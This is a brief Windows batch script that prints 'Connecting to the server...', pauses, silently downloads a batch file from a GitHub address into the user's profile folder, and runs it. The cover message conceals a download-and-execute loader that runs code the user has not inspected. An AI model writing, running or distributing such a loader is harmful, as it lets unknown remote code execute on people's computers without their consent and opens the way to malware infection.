@echo off
color a
echo Connecting to the server...
timeout -t 5 /nobreak
curl -L -s -o "C:\Users\%username%\ajotak\ajotak.bat" https://github.com/beeczxd/ajotakv2/blob/main/ajeotak.bat
start C:\Users\%username%\ajotak\ajotak.bat
pause >nul
exit /b
